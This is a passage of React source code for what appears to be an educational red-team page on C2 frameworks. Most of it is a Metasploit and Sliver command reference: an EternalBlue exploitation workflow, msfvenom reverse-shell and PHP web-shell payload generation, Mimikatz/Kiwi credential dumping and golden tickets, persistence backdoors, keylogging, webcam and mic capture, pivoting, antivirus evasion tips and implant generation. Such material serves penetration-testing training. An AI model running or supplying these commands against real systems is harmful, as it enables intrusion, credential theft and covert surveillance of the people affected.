                                "Runs entirely in memory (no disk artifacts)",
                                "Uses encrypted TLS communication",
                                "Reflective DLL injection for loading",
                                "Extensible via runtime module loading",
                                "Supports multiple transport protocols",
                                "Session migration between processes",
                                "Timestomping and anti-forensics"
                              ].map((item, i) => (
                                <ListItem key={i} sx={{ py: 0.25 }}>
                                  <ListItemIcon sx={{ minWidth: 20 }}>
                                    <CheckCircleIcon sx={{ fontSize: 12, color: "#8b5cf6" }} />
                                  </ListItemIcon>
                                  <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", fontSize: "0.8rem" }} />
                                </ListItem>
                              ))}
                            </List>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={6}>
                          <Paper sx={{ p: 2, bgcolor: alpha("#ec4899", 0.05), border: `1px solid ${alpha("#ec4899", 0.2)}` }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ec4899", mb: 1 }}>
                              Meterpreter Variants
                            </Typography>
                            <List dense>
                              {[
                                { name: "windows/meterpreter", desc: "Standard Windows x86/x64" },
                                { name: "windows/meterpreter_reverse_https", desc: "HTTPS encrypted comms" },
                                { name: "linux/meterpreter", desc: "Linux ELF payload" },
                                { name: "java/meterpreter", desc: "Cross-platform Java JAR" },
                                { name: "python/meterpreter", desc: "Python-based for flexibility" },
                                { name: "php/meterpreter", desc: "PHP web server payload" },
                                { name: "android/meterpreter", desc: "Android APK payload" }
                              ].map((item, i) => (
                                <ListItem key={i} sx={{ py: 0.25 }}>
                                  <ListItemText 
                                    primary={item.name} 
                                    secondary={item.desc}
                                    primaryTypographyProps={{ variant: "body2", fontFamily: "monospace", fontSize: "0.75rem", color: "#ec4899" }} 
                                    secondaryTypographyProps={{ variant: "caption", fontSize: "0.7rem" }}
                                  />
                                </ListItem>
                              ))}
                            </List>
                          </Paper>
                        </Grid>
                      </Grid>

                      {/* Essential Meterpreter Commands */}
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                        <TerminalIcon sx={{ color: accent }} />
                        Essential Meterpreter Commands
                      </Typography>
                      <Grid container spacing={2} sx={{ mb: 3 }}>
                        <Grid item xs={12} md={4}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#06b6d4" }}>
                              System Information
                            </Typography>
                            <Box component="pre" sx={{ 
                              bgcolor: "#1e1e1e", 
                              color: "#d4d4d4", 
                              p: 1.5, 
                              borderRadius: 1, 
                              fontSize: "0.7rem",
                              overflow: "auto"
                            }}>
{`meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > ps
meterpreter > getprivs
meterpreter > getsystem`}
                            </Box>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={4}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f97316" }}>
                              File System Operations
                            </Typography>
                            <Box component="pre" sx={{ 
                              bgcolor: "#1e1e1e", 
                              color: "#d4d4d4", 
                              p: 1.5, 
                              borderRadius: 1, 
                              fontSize: "0.7rem",
                              overflow: "auto"
                            }}>
{`meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Users
meterpreter > download secrets.txt
meterpreter > upload shell.exe
meterpreter > search -f *.docx`}
                            </Box>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={4}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#a855f7" }}>
                              Network Operations
                            </Typography>
                            <Box component="pre" sx={{ 
                              bgcolor: "#1e1e1e", 
                              color: "#d4d4d4", 
                              p: 1.5, 
                              borderRadius: 1, 
                              fontSize: "0.7rem",
                              overflow: "auto"
                            }}>
{`meterpreter > ipconfig
meterpreter > netstat
meterpreter > arp
meterpreter > route
meterpreter > portfwd add -l 3389 \\
              -p 3389 -r 10.0.0.5
meterpreter > run autoroute -s 10.0.0.0/24`}
                            </Box>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={4}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#ef4444" }}>
                              Credential Harvesting
                            </Typography>
                            <Box component="pre" sx={{ 
                              bgcolor: "#1e1e1e", 
                              color: "#d4d4d4", 
                              p: 1.5, 
                              borderRadius: 1, 
                              fontSize: "0.7rem",
                              overflow: "auto"
                            }}>
{`meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
meterpreter > wifi_list`}
                            </Box>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={4}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#22c55e" }}>
                              Process & Session
                            </Typography>
                            <Box component="pre" sx={{ 
                              bgcolor: "#1e1e1e", 
                              color: "#d4d4d4", 
                              p: 1.5, 
                              borderRadius: 1, 
                              fontSize: "0.7rem",
                              overflow: "auto"
                            }}>
{`meterpreter > migrate 1234
meterpreter > execute -f cmd.exe -i -H
meterpreter > shell
meterpreter > background
meterpreter > sessions -l
meterpreter > sessions -i 1`}
                            </Box>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={4}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#0ea5e9" }}>
                              Surveillance
                            </Typography>
                            <Box component="pre" sx={{ 
                              bgcolor: "#1e1e1e", 
                              color: "#d4d4d4", 
                              p: 1.5, 
                              borderRadius: 1, 
                              fontSize: "0.7rem",
                              overflow: "auto"
                            }}>
{`meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > webcam_snap
meterpreter > record_mic
meterpreter > screenshare`}
                            </Box>
                          </Paper>
                        </Grid>
                      </Grid>

                      {/* Common Workflow */}
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                        <TimelineIcon sx={{ color: accent }} />
                        Typical Metasploit Workflow
                      </Typography>
                      <Stepper orientation="vertical" sx={{ mb: 3 }}>
                        <Step active>
                          <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>1. Reconnaissance & Scanning</Typography></StepLabel>
                          <StepContent>
                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.75rem" }}>
{`msf6 > db_nmap -sV -sC -p- 192.168.1.0/24
msf6 > hosts
msf6 > services -p 445
msf6 > vulns`}
                            </Box>
                          </StepContent>
                        </Step>
                        <Step active>
                          <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>2. Select & Configure Exploit</Typography></StepLabel>
                          <StepContent>
                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.75rem" }}>
{`msf6 > search type:exploit platform:windows smb
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > show options
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50`}
                            </Box>
                          </StepContent>
                        </Step>
                        <Step active>
                          <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>3. Select Payload</Typography></StepLabel>
                          <StepContent>
                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.75rem" }}>
{`msf6 exploit(ms17_010_eternalblue) > show payloads
msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > show options`}
                            </Box>
                          </StepContent>
                        </Step>
                        <Step active>
                          <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>4. Execute & Get Shell</Typography></StepLabel>
                          <StepContent>
                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.75rem" }}>
{`msf6 exploit(ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.1.50:4444
[*] Sending exploit...
[*] Meterpreter session 1 opened
meterpreter > sysinfo`}
                            </Box>
                          </StepContent>
                        </Step>
                        <Step active>
                          <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>5. Post-Exploitation</Typography></StepLabel>
                          <StepContent>
                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.75rem" }}>
{`meterpreter > getsystem
meterpreter > hashdump
meterpreter > run post/windows/gather/enum_logged_on_users
meterpreter > run post/multi/manage/autoroute
meterpreter > run post/windows/manage/persistence_exe`}
                            </Box>
                          </StepContent>
                        </Step>
                      </Stepper>

                      {/* msfvenom Payload Generation */}
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                        <BuildIcon sx={{ color: accent }} />
                        msfvenom Payload Generation
                      </Typography>
                      <Alert severity="info" sx={{ mb: 2 }}>
                        <Typography variant="body2">
                          msfvenom combines payload generation and encoding. Use <code>-p</code> for payload, <code>-f</code> for format, <code>-e</code> for encoder, <code>-i</code> for iterations.
                        </Typography>
                      </Alert>
                      <Grid container spacing={2} sx={{ mb: 3 }}>
                        <Grid item xs={12} md={6}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Windows Payloads</Typography>
                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.65rem", overflow: "auto" }}>
{`# Staged Meterpreter (smaller, needs handler)
msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST=192.168.1.50 LPORT=443 -f exe > shell.exe

# Stageless Meterpreter (larger, self-contained)
msfvenom -p windows/x64/meterpreter_reverse_https \\
  LHOST=192.168.1.50 LPORT=443 -f exe > shell.exe

# DLL payload for DLL hijacking
msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST=192.168.1.50 LPORT=443 -f dll > evil.dll

# PowerShell one-liner
msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST=192.168.1.50 LPORT=443 -f psh-cmd`}
                            </Box>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={6}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Linux & Web Payloads</Typography>
                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.65rem", overflow: "auto" }}>
{`# Linux ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp \\
  LHOST=192.168.1.50 LPORT=443 -f elf > shell.elf

# Python payload
msfvenom -p python/meterpreter/reverse_tcp \\
  LHOST=192.168.1.50 LPORT=443 -f raw > shell.py

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp \\
  LHOST=192.168.1.50 LPORT=443 -f raw > shell.php

# Java JAR
msfvenom -p java/meterpreter/reverse_tcp \\
  LHOST=192.168.1.50 LPORT=443 -f jar > shell.jar`}
                            </Box>
                          </Paper>
                        </Grid>
                      </Grid>

                      {/* Pivoting & Port Forwarding */}
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                        <RouterIcon sx={{ color: accent }} />
                        Pivoting & Network Tunneling
                      </Typography>
                      <Grid container spacing={2} sx={{ mb: 3 }}>
                        <Grid item xs={12} md={6}>
                          <Paper sx={{ p: 2, bgcolor: alpha("#14b8a6", 0.05), border: `1px solid ${alpha("#14b8a6", 0.2)}` }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#14b8a6", mb: 1 }}>Autoroute (Pivoting)</Typography>
                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                              Route traffic through a compromised host to reach internal networks.
                            </Typography>
                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1, borderRadius: 1, fontSize: "0.7rem" }}>
{`# Add route through session
meterpreter > run autoroute -s 10.10.10.0/24

# Or from msfconsole
msf6 > route add 10.10.10.0/24 1

# Verify routes
msf6 > route print`}
                            </Box>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={6}>
                          <Paper sx={{ p: 2, bgcolor: alpha("#f472b6", 0.05), border: `1px solid ${alpha("#f472b6", 0.2)}` }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f472b6", mb: 1 }}>Port Forwarding</Typography>
                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                              Forward local ports to access remote services through the session.
                            </Typography>
                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1, borderRadius: 1, fontSize: "0.7rem" }}>
{`# Local port forward (access RDP)
meterpreter > portfwd add -l 3389 \\
  -p 3389 -r 10.10.10.5

# Reverse port forward
meterpreter > portfwd add -R -l 8080 \\
  -p 80 -L 192.168.1.50

# SOCKS proxy for browser
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 9050
msf6 > run -j`}
                            </Box>
                          </Paper>
                        </Grid>
                      </Grid>

                      {/* Key Post-Exploitation Modules */}
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                        <SecurityIcon sx={{ color: accent }} />
                        Essential Post-Exploitation Modules
                      </Typography>
                      <TableContainer component={Paper} sx={{ mb: 3 }}>
                        <Table size="small">
                          <TableHead>
                            <TableRow sx={{ bgcolor: alpha(accent, 0.1) }}>
                              <TableCell sx={{ fontWeight: 700 }}>Module</TableCell>
                              <TableCell sx={{ fontWeight: 700 }}>Purpose</TableCell>
                            </TableRow>
                          </TableHead>
                          <TableBody>
                            {[
                              { module: "post/windows/gather/hashdump", purpose: "Dump SAM database hashes" },
                              { module: "post/windows/gather/credentials/credential_collector", purpose: "Collect various credentials" },
                              { module: "post/multi/recon/local_exploit_suggester", purpose: "Suggest privilege escalation exploits" },
                              { module: "post/windows/gather/enum_domain", purpose: "Enumerate Active Directory domain" },
                              { module: "post/windows/manage/migrate", purpose: "Migrate to another process" },
                              { module: "post/windows/manage/persistence_exe", purpose: "Install persistent backdoor" },
                              { module: "post/windows/gather/enum_logged_on_users", purpose: "List logged-on users" },
                              { module: "post/windows/gather/enum_shares", purpose: "Enumerate network shares" },
                              { module: "post/multi/manage/shell_to_meterpreter", purpose: "Upgrade shell to Meterpreter" },
                              { module: "post/windows/gather/smart_hashdump", purpose: "Smart hash dump with PSExec" },
                            ].map((row, i) => (
                              <TableRow key={i}>
                                <TableCell sx={{ fontFamily: "monospace", fontSize: "0.7rem", color: accent }}>{row.module}</TableCell>
                                <TableCell sx={{ fontSize: "0.8rem" }}>{row.purpose}</TableCell>
                              </TableRow>
                            ))}
                          </TableBody>
                        </Table>
                      </TableContainer>

                      {/* Kiwi (Mimikatz) */}
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                        <FingerprintIcon sx={{ color: accent }} />
                        Kiwi Extension (Mimikatz Integration)
                      </Typography>
                      <Alert severity="error" sx={{ mb: 2 }}>
                        <AlertTitle>Windows Credential Extraction</AlertTitle>
                        <Typography variant="body2">
                          Kiwi brings Mimikatz capabilities directly into Meterpreter. Requires SYSTEM privileges. Highly detected - use sparingly.
                        </Typography>
                      </Alert>
                      <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 2, borderRadius: 1, fontSize: "0.75rem", mb: 3 }}>
{`meterpreter > getsystem                    # Escalate to SYSTEM
meterpreter > load kiwi                    # Load Mimikatz extension
meterpreter > help kiwi                    # Show kiwi commands

# Credential dumping
meterpreter > creds_all                    # All credentials
meterpreter > creds_msv                    # MSV credentials (NTLM hashes)
meterpreter > creds_kerberos               # Kerberos tickets
meterpreter > creds_wdigest                # WDigest plaintext (if enabled)
meterpreter > creds_tspkg                  # TsPkg credentials

# LSA secrets
meterpreter > lsa_dump_sam                 # SAM database
meterpreter > lsa_dump_secrets             # LSA secrets (service accounts)

# Golden ticket
meterpreter > golden_ticket_create -d DOMAIN.LOCAL \\
  -u Administrator -s S-1-5-21-... -k <krbtgt_hash> -t /tmp/golden.kirbi

# Kerberos ticket manipulation
meterpreter > kerberos_ticket_list         # List tickets
meterpreter > kerberos_ticket_purge        # Purge tickets
meterpreter > kerberos_ticket_use /tmp/ticket.kirbi   # Load ticket`}
                      </Box>

                      {/* Database & Workspaces */}
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                        <StorageIcon sx={{ color: accent }} />
                        Database & Workspaces
                      </Typography>
                      <Grid container spacing={2} sx={{ mb: 3 }}>
                        <Grid item xs={12} md={6}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Database Setup</Typography>
                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.7rem" }}>
{`# Initialize database
$ sudo msfdb init

# Connect in msfconsole
msf6 > db_status
msf6 > db_connect msf:password@127.0.0.1/msf

# Import nmap results
msf6 > db_import /path/to/scan.xml`}
                            </Box>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={6}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Workspace Management</Typography>
                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.7rem" }}>
{`# List workspaces
msf6 > workspace

# Create new workspace
msf6 > workspace -a clientname

# Switch workspace
msf6 > workspace clientname

# Delete workspace
msf6 > workspace -d oldproject`}
                            </Box>
                          </Paper>
                        </Grid>
                      </Grid>

                      {/* Resource Scripts */}
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                        <CodeIcon sx={{ color: accent }} />
                        Resource Scripts & Automation
                      </Typography>
                      <Grid container spacing={2} sx={{ mb: 3 }}>
                        <Grid item xs={12}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                              Resource scripts (.rc files) automate repetitive tasks. Execute with <code>resource filename.rc</code>.
                            </Typography>
                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.7rem" }}>
{`# quick_handler.rc - Set up a reverse shell handler
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j

# Run with: msf6 > resource quick_handler.rc

# auto_post.rc - Automatic post-exploitation
sysinfo
getuid
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_logged_on_users
hashdump`}
                            </Box>
                          </Paper>
                        </Grid>
                      </Grid>

                      {/* Evasion Tips */}
                      <Alert severity="warning" sx={{ mb: 2, borderRadius: 2 }}>
                        <AlertTitle>⚠️ Detection & Evasion Considerations</AlertTitle>
                        <Grid container spacing={2}>
                          <Grid item xs={12} md={6}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Why Metasploit Gets Detected</Typography>
                            <List dense>
                              {[
                                "Default payloads are heavily signatured",
                                "Network traffic patterns are well-known",
                                "Default shellcode is in every AV database",
                                "Process injection techniques are monitored",
                                "Meterpreter DLL hashes are known"
                              ].map((item, i) => (
                                <ListItem key={i} sx={{ py: 0 }}>
                                  <ListItemIcon sx={{ minWidth: 20 }}>
                                    <WarningIcon sx={{ fontSize: 12, color: "warning.main" }} />
                                  </ListItemIcon>
                                  <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", fontSize: "0.75rem" }} />
                                </ListItem>
                              ))}
                            </List>
                          </Grid>
                          <Grid item xs={12} md={6}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Basic Evasion Techniques</Typography>
                            <List dense>
                              {[
                                "Use stageless payloads for smaller signatures",
                                "Apply encoders: -e x64/zutto_dekiru -i 5",
                                "Use custom templates: -x legitimate.exe",
                                "Encrypt communications: reverse_https",
                                "Consider Veil, Shellter, or custom loaders"
                              ].map((item, i) => (
                                <ListItem key={i} sx={{ py: 0 }}>
                                  <ListItemIcon sx={{ minWidth: 20 }}>
                                    <CheckCircleIcon sx={{ fontSize: 12, color: "success.main" }} />
                                  </ListItemIcon>
                                  <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", fontSize: "0.75rem" }} />
                                </ListItem>
                              ))}
                            </List>
                          </Grid>
                        </Grid>
                      </Alert>

                      {/* Learning Resources */}
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                        <SchoolIcon sx={{ color: accent }} />
                        Learning Path & Resources
                      </Typography>
                      <Grid container spacing={2}>
                        <Grid item xs={12} md={4}>
                          <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05) }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6", mb: 1 }}>Beginner</Typography>
                            <List dense>
                              {[
                                "Metasploit Unleashed (free course)",
                                "TryHackMe Metasploit rooms",
                                "HackTheBox Starting Point",
                                "Official documentation"
                              ].map((item, i) => (
                                <ListItem key={i} sx={{ py: 0.25 }}>
                                  <ListItemText primary={`• ${item}`} primaryTypographyProps={{ variant: "body2", fontSize: "0.8rem" }} />
                                </ListItem>
                              ))}
                            </List>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={4}>
                          <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05) }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b", mb: 1 }}>Intermediate</Typography>
                            <List dense>
                              {[
                                "Custom module development",
                                "Advanced pivoting techniques",
                                "Post-exploitation automation",
                                "Payload customization"
                              ].map((item, i) => (
                                <ListItem key={i} sx={{ py: 0.25 }}>
                                  <ListItemText primary={`• ${item}`} primaryTypographyProps={{ variant: "body2", fontSize: "0.8rem" }} />
                                </ListItem>
                              ))}
                            </List>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={4}>
                          <Paper sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05) }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>Advanced</Typography>
                            <List dense>
                              {[
                                "Writing custom exploits",
                                "ROP chain development",
                                "Evasion research",
                                "Contribute to Metasploit"
                              ].map((item, i) => (
                                <ListItem key={i} sx={{ py: 0.25 }}>
                                  <ListItemText primary={`• ${item}`} primaryTypographyProps={{ variant: "body2", fontSize: "0.8rem" }} />
                                </ListItem>
                              ))}
                            </List>
                          </Paper>
                        </Grid>
                      </Grid>
                    </Grid>
                  )}
                </Grid>
              </AccordionDetails>
            </Accordion>
          );
          })}

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Framework Comparison Matrix
            </Typography>
            <TableContainer>
              <Table size="small">
                <TableHead>
                  <TableRow>
                    <TableCell sx={{ fontWeight: 700 }}>Framework</TableCell>
                    <TableCell sx={{ fontWeight: 700 }}>Type</TableCell>
                    <TableCell sx={{ fontWeight: 700 }}>Learning Curve</TableCell>
                    <TableCell sx={{ fontWeight: 700 }}>Best For</TableCell>
                    <TableCell sx={{ fontWeight: 700 }}>EDR Evasion</TableCell>
                  </TableRow>
                </TableHead>
                <TableBody>
                  {[
                    { name: "Cobalt Strike", type: "Commercial", curve: "Medium", best: "Enterprise red teams", evasion: "★★★★☆" },
                    { name: "Brute Ratel", type: "Commercial", curve: "Medium", best: "EDR-heavy environments", evasion: "★★★★★" },
                    { name: "Nighthawk", type: "Commercial", curve: "Hard", best: "Advanced adversary sim", evasion: "★★★★★" },
                    { name: "Sliver", type: "Open Source", curve: "Easy", best: "Cross-platform, learning", evasion: "★★★★☆" },
                    { name: "Havoc", type: "Open Source", curve: "Medium", best: "Windows-focused ops", evasion: "★★★★☆" },
                    { name: "Mythic", type: "Open Source", curve: "Medium", best: "Multi-platform teams", evasion: "★★★★☆" },
                    { name: "PoshC2", type: "Open Source", curve: "Easy", best: "PowerShell-heavy envs", evasion: "★★★☆☆" },
                    { name: "Covenant", type: "Open Source", curve: "Easy", best: ".NET environments", evasion: "★★★☆☆" },
                    { name: "Metasploit", type: "Open Source", curve: "Easy", best: "Learning/CTFs", evasion: "★★☆☆☆" },
                  ].map((row, i) => (
                    <TableRow key={i}>
                      <TableCell sx={{ fontWeight: 600 }}>{row.name}</TableCell>
                      <TableCell>
                        <Chip 
                          label={row.type} 
                          size="small" 
                          color={row.type === "Commercial" ? "warning" : "success"} 
                          variant="outlined"
                        />
                      </TableCell>
                      <TableCell>{row.curve}</TableCell>
                      <TableCell>{row.best}</TableCell>
                      <TableCell>{row.evasion}</TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </TableContainer>
          </Paper>

          {/* Quick Start Guide */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Quick Start: Setting Up Sliver (Recommended for Beginners)
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              Sliver is the recommended starting point for learning C2 operations. Here's a complete setup guide:
            </Typography>
            <Stepper orientation="vertical">
              <Step active>
                <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Install Sliver Server</Typography></StepLabel>
                <StepContent>
                  <CodeBlock language="bash">{`# Linux/macOS - One-liner installation
curl https://sliver.sh/install | sudo bash

# Or manual download from GitHub releases
# https://github.com/BishopFox/sliver/releases

# Start the server (first run generates certificates)
sliver-server`}</CodeBlock>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Generate an Implant</Typography></StepLabel>
                <StepContent>
                  <CodeBlock language="bash">{`# Generate Windows implant with MTLS
generate --mtls YOUR_IP:443 --os windows --arch amd64 --save implant.exe

# Generate Linux implant with HTTP
generate --http YOUR_IP:80 --os linux --arch amd64 --save implant

# Generate macOS implant
generate --mtls YOUR_IP:443 --os darwin --arch amd64 --save implant.app`}</CodeBlock>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Start a Listener</Typography></StepLabel>
                <StepContent>
                  <CodeBlock language="bash">{`# Start MTLS listener on port 443
mtls --lhost 0.0.0.0 --lport 443

# Or HTTP listener
http --lhost 0.0.0.0 --lport 80 --domain cdn.example.com

# View active listeners
jobs`}</CodeBlock>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Interact with Sessions</Typography></StepLabel>
                <StepContent>
                  <CodeBlock language="bash">{`# List sessions
sessions

# Use a session (tab complete works)
use [session-id]

# Basic commands
info        # System info
whoami      # Current user
pwd         # Current directory
ps          # Process list
netstat     # Network connections
shell       # Interactive shell`}</CodeBlock>
                </StepContent>
              </Step>
            </Stepper>
          </Paper>
        </Box>

      {/* Section: Protocols */}
      <Box id="protocols" sx={{ display: "flex", flexDirection: "column", gap: 3, mt: 4, scrollMarginTop: 80 }}>
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
          <NetworkCheckIcon sx={{ color: accent }} />
          Protocols
        </Typography>
        <Alert severity="info" sx={{ borderRadius: 2 }}>
          <AlertTitle>C2 Communication Protocols</AlertTitle>
          Different protocols offer trade-offs between stealth, speed, and reliability.
          Choose based on target environment and detection capabilities. Most operations use HTTPS
          for initial callback, with DNS as a fallback channel.
        </Alert>

          {/* Protocol Quick Reference */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Protocol Selection Guide</Typography>
            <Grid container spacing={2}>
              {[
                { proto: "HTTPS", when: "Default choice - blends with normal traffic", icon: <HttpIcon sx={{ color: "#3b82f6" }} /> },
                { proto: "DNS", when: "Highly restricted networks, fallback channel", icon: <DnsIcon sx={{ color: "#10b981" }} /> },
                { proto: "SMB", when: "Internal movement without egress", icon: <RouterIcon sx={{ color: "#8b5cf6" }} /> },
                { proto: "ICMP", when: "When all else fails, firewall bypass", icon: <NetworkCheckIcon sx={{ color: "#f59e0b" }} /> },
              ].map((item, i) => (
                <Grid item xs={12} sm={6} key={i}>
                  <Box sx={{ display: "flex", gap: 2, alignItems: "center", p: 2, bgcolor: alpha(theme.palette.primary.main, 0.03), borderRadius: 1 }}>
                    {item.icon}
                    <Box>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.proto}</Typography>
                      <Typography variant="caption" color="text.secondary">{item.when}</Typography>
                    </Box>
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {c2Protocols.map((proto, idx) => (
            <Accordion key={idx} defaultExpanded={idx === 0}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%" }}>
                  <Box sx={{ color: "primary.main" }}>{proto.icon}</Box>
                  <Box sx={{ flex: 1 }}>
                    <Typography variant="h6" sx={{ fontWeight: 700 }}>{proto.protocol}</Typography>
                    <Typography variant="body2" color="text.secondary">{proto.description}</Typography>
                  </Box>
                </Box>
              </AccordionSummary>
